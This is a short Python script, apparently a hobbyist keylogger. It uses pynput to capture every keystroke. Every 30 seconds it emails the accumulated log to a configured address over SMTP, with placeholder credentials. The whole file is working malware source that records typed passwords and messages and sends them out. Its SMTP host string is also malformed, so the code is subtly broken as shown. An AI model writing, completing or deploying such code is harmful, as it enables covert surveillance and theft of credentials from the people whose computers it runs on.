import pynput.keyboard
import smtplib
import threading
log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log= log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)
def send_email(email,password,key):
    email_server = smtplib.SMTP("smtp@gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,key)
    email_server.quit()
def thread_function():
    global log
    send_email("<youremail>", "<yourpassword>", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()
keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)
#threading
with keyboard_listener:
    thread_function()
    keyboard_listener.join()
